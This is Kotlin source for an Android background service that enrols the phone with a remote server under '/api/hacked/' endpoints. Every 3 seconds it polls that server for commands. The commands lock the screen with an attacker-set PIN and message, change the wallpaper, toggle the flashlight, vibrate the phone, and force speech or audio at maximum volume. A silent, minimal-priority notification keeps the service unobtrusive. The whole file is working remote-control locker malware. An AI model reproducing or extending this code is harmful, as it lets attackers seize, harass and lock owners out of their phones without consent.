package com.psknmrc.app

import android.app.*
import android.app.WallpaperManager
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.hardware.camera2.CameraManager
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.MediaPlayer
import android.os.*
import android.speech.tts.TextToSpeech
import android.util.Base64
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.io.ByteArrayInputStream
import java.io.File
import java.io.FileOutputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.Locale

class SocketService : Service() {

    private val CHANNEL_ID = "psknmrc_socket_channel"
    private val NOTIF_ID   = 101

    private var serverUrl     = ""
    private var deviceId      = ""
    private var deviceName    = ""
    private var ownerUsername = ""
    private var deviceToken   = ""

    private val handler = Handler(Looper.getMainLooper())
    private var pollRunnable:      Runnable? = null
    private var heartbeatRunnable: Runnable? = null

    private var flashOn       = false
    private var cameraManager: CameraManager? = null
    private var cameraId:      String?        = null

    private var tts: TextToSpeech? = null
    private var ttsReady = false
    private var mediaPlayer: MediaPlayer? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification("Connecting..."))
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as? CameraManager
        Thread {
            try { cameraId = cameraManager?.cameraIdList?.firstOrNull() } catch (_: Exception) {}
        }.start()

        // Init Text To Speech
        tts = TextToSpeech(this) { status ->
            if (status == TextToSpeech.SUCCESS) {
                tts?.language = Locale("id", "ID")
                ttsReady = true
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Ambil dari intent, fallback ke SharedPreferences supaya auto-reconnect bisa kerja
        val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)

        serverUrl     = intent?.getStringExtra("serverUrl")     ?: prefs.getString("flutter.serverUrl",     "") ?: ""
        deviceId      = intent?.getStringExtra("deviceId")      ?: prefs.getString("flutter.deviceId",      "") ?: ""
        deviceName    = intent?.getStringExtra("deviceName")    ?: prefs.getString("flutter.deviceName",    "") ?: ""
        ownerUsername = intent?.getStringExtra("ownerUsername") ?: prefs.getString("flutter.ownerUsername", "") ?: ""

        // Coba ambil token tersimpan
        if (deviceToken.isEmpty()) {
            val appPrefs = getSharedPreferences("psknmrc_prefs", Context.MODE_PRIVATE)
            deviceToken = appPrefs.getString("deviceToken_$deviceId", "") ?: ""
        }
        deviceToken = intent?.getStringExtra("deviceToken") ?: deviceToken

        if (deviceId.isNotEmpty() && serverUrl.isNotEmpty()) {
            registerDevice()
            startPolling()
            startHeartbeat()
        }
        return START_STICKY
    }

    private fun registerDevice() {
        Thread {
            try {
                val body = JSONObject().apply {
                    put("deviceId",      deviceId)
                    put("deviceName",    deviceName)
                    put("ownerUsername", ownerUsername)
                }.toString()
                val url  = URL("$serverUrl/api/hacked/register")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 10000
                conn.readTimeout    = 10000
                OutputStreamWriter(conn.outputStream).also { it.write(body); it.flush() }
                val res  = conn.inputStream.bufferedReader().readText()
                val json = JSONObject(res)
                if (json.optBoolean("success")) {
                    val tok = json.optString("token")
                    if (tok.isNotEmpty()) {
                        deviceToken = tok
                        val appPrefs = getSharedPreferences("psknmrc_prefs", Context.MODE_PRIVATE)
                        appPrefs.edit().putString("deviceToken_$deviceId", tok).apply()
                    }
                    updateNotification("Connected ✓")
                }
                conn.disconnect()
            } catch (e: Exception) { e.printStackTrace() }
        }.start()
    }

    private fun startPolling() {
        pollRunnable?.let { handler.removeCallbacks(it) }
        pollRunnable = object : Runnable {
            override fun run() {
                pollForCommand()
                handler.postDelayed(this, 3000)
            }
        }
        handler.postDelayed(pollRunnable!!, 3000)
    }

    private fun startHeartbeat() {
        heartbeatRunnable?.let { handler.removeCallbacks(it) }
        heartbeatRunnable = object : Runnable {
            override fun run() {
                sendHeartbeat()
                handler.postDelayed(this, 15000)
            }
        }
        handler.postDelayed(heartbeatRunnable!!, 15000)
    }

    private fun pollForCommand() {
        if (deviceId.isEmpty() || serverUrl.isEmpty() || deviceToken.isEmpty()) return
        Thread {
            try {
                val url  = URL("$serverUrl/api/hacked/poll/$deviceId")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.setRequestProperty("x-device-token", deviceToken)
                conn.connectTimeout = 8000
                conn.readTimeout    = 8000
                if (conn.responseCode == 200) {
                    val res  = conn.inputStream.bufferedReader().readText()
                    val json = JSONObject(res)
                    val cmd  = json.optJSONObject("command")
                    if (cmd != null) executeCommand(cmd)
                }
                conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    private fun sendHeartbeat() {
        if (deviceId.isEmpty() || serverUrl.isEmpty() || deviceToken.isEmpty()) return
        Thread {
            try {
                val url  = URL("$serverUrl/api/hacked/heartbeat/$deviceId")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("x-device-token", deviceToken)
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 8000
                conn.readTimeout    = 8000
                OutputStreamWriter(conn.outputStream).also { it.write("{}"); it.flush() }
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    private fun executeCommand(cmd: JSONObject) {
        val type    = cmd.optString("type")
        val payload = cmd.optJSONObject("payload") ?: JSONObject()

        when (type) {
            "lock" -> {
                val text = payload.optString("text", "")
                val pin  = payload.optString("pin",  "1234")
                handler.post {
                    val intent = Intent(this, LockService::class.java).apply {
                        putExtra("action",   "lock")
                        putExtra("lockText", text)
                        putExtra("lockPin",  pin)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        startForegroundService(intent)
                    else
                        startService(intent)
                }
            }
            "unlock" -> {
                handler.post {
                    startService(Intent(this, LockService::class.java).apply {
                        putExtra("action", "unlock")
                    })
                }
            }
            "flashlight" -> {
                setFlashlight(payload.optString("state", "off") == "on")
            }
            "wallpaper" -> {
                val base64 = payload.optString("imageBase64", "")
                if (base64.isNotEmpty()) {
                    setWallpaperFromBase64(base64)
                }
            }
            "vibrate" -> {
                val duration = payload.optLong("duration", 2000)
                val pattern  = payload.optString("pattern", "single")
                vibrateDevice(duration, pattern)
            }
            "tts" -> {
                val text = payload.optString("text", "")
                val lang = payload.optString("lang", "id")
                if (text.isNotEmpty()) speakText(text, lang)
            }
            "sound" -> {
                val base64Audio = payload.optString("audioBase64", "")
                val mimeType    = payload.optString("mimeType", "audio/mpeg")
                if (base64Audio.isNotEmpty()) playSoundFromBase64(base64Audio, mimeType)
            }
        }
    }

    private fun setFlashlight(on: Boolean) {
        try {
            val cm = cameraManager ?: return
            val id = cameraId ?: return
            cm.setTorchMode(id, on)
            flashOn = on
        } catch (_: Exception) {}
    }

    private fun setWallpaperFromBase64(base64: String) {
        Thread {
            try {
                // Decode base64 → byte array
                val bytes  = Base64.decode(base64, Base64.DEFAULT)
                val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                    ?: run {
                        updateNotification("Wallpaper: gagal decode gambar")
                        return@Thread
                    }

                val wm = WallpaperManager.getInstance(applicationContext)

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    // Android 7+ — pakai setStream supaya lebih reliable
                    val stream = ByteArrayInputStream(bytes)
                    wm.setStream(stream)
                    stream.close()
                } else {
                    wm.setBitmap(bitmap)
                }

                bitmap.recycle()
                updateNotification("Wallpaper updated ✓")
            } catch (e: Exception) {
                e.printStackTrace()
                updateNotification("Wallpaper error: ${e.message?.take(30)}")
            }
        }.start()
    }

    private fun vibrateDevice(duration: Long, pattern: String) {
        try {
            val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vm = getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
                vm.defaultVibrator
            } else {
                @Suppress("DEPRECATION")
                getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val vibe = when (pattern) {
                    "sos"  -> VibrationEffect.createWaveform(longArrayOf(0,200,100,200,100,600,100,200,100,200,100,600), -1)
                    "double" -> VibrationEffect.createWaveform(longArrayOf(0,400,200,400), -1)
                    else   -> VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE)
                }
                vibrator.vibrate(vibe)
            } else {
                @Suppress("DEPRECATION")
                when (pattern) {
                    "sos"    -> vibrator.vibrate(longArrayOf(0,200,100,200,100,600,100,200,100,200,100,600), -1)
                    "double" -> vibrator.vibrate(longArrayOf(0,400,200,400), -1)
                    else     -> vibrator.vibrate(duration)
                }
            }
            updateNotification("Vibrate aktif ✓")
        } catch (e: Exception) {
            updateNotification("Vibrate error: ${e.message?.take(30)}")
        }
    }

    private fun speakText(text: String, lang: String) {
        try {
            // Set max volume
            val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            am.setStreamVolume(AudioManager.STREAM_MUSIC,
                am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)

            if (!ttsReady || tts == null) {
                // Init baru kalau belum ready
                tts = TextToSpeech(this) { status ->
                    if (status == TextToSpeech.SUCCESS) {
                        val locale = if (lang == "en") Locale.ENGLISH else Locale("id", "ID")
                        tts?.language = locale
                        ttsReady = true
                        tts?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "tts_speak")
                    }
                }
            } else {
                val locale = if (lang == "en") Locale.ENGLISH else Locale("id", "ID")
                tts?.language = locale
                tts?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "tts_speak")
            }
            updateNotification("TTS berbicara ✓")
        } catch (e: Exception) {
            updateNotification("TTS error: ${e.message?.take(30)}")
        }
    }

    private fun playSoundFromBase64(base64Audio: String, mimeType: String) {
        Thread {
            try {
                val bytes = Base64.decode(base64Audio, Base64.DEFAULT)
                val ext   = when {
                    mimeType.contains("mp3")  || mimeType.contains("mpeg") -> "mp3"
                    mimeType.contains("wav")  -> "wav"
                    mimeType.contains("ogg")  -> "ogg"
                    else                      -> "mp3"
                }
                val tmpFile = File(cacheDir, "psknmrc_sound.$ext")
                FileOutputStream(tmpFile).use { it.write(bytes) }

                // Set max volume
                val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
                am.setStreamVolume(AudioManager.STREAM_MUSIC,
                    am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)

                handler.post {
                    try {
                        mediaPlayer?.release()
                        mediaPlayer = MediaPlayer().apply {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                                setAudioAttributes(
                                    AudioAttributes.Builder()
                                        .setUsage(AudioAttributes.USAGE_MEDIA)
                                        .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                                        .build()
                                )
                            } else {
                                @Suppress("DEPRECATION")
                                setAudioStreamType(AudioManager.STREAM_MUSIC)
                            }
                            setDataSource(tmpFile.absolutePath)
                            prepare()
                            start()
                            setOnCompletionListener { release(); mediaPlayer = null }
                        }
                        updateNotification("Sound dimainkan ✓")
                    } catch (e: Exception) {
                        updateNotification("Sound error: ${e.message?.take(30)}")
                    }
                }
            } catch (e: Exception) {
                updateNotification("Sound decode error: ${e.message?.take(30)}")
            }
        }.start()
    }

    private fun updateNotification(text: String) {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        nm.notify(NOTIF_ID, buildNotification(text))
    }

    private fun buildNotification(text: String): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("PSKNMRC")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .build()

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "PSKNMRC Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply { setShowBadge(false) }
            (getSystemService(NotificationManager::class.java))
                .createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        pollRunnable?.let { handler.removeCallbacks(it) }
        heartbeatRunnable?.let { handler.removeCallbacks(it) }
        try { setFlashlight(false) } catch (_: Exception) {}
        tts?.stop()
        tts?.shutdown()
        mediaPlayer?.release()
    }
}
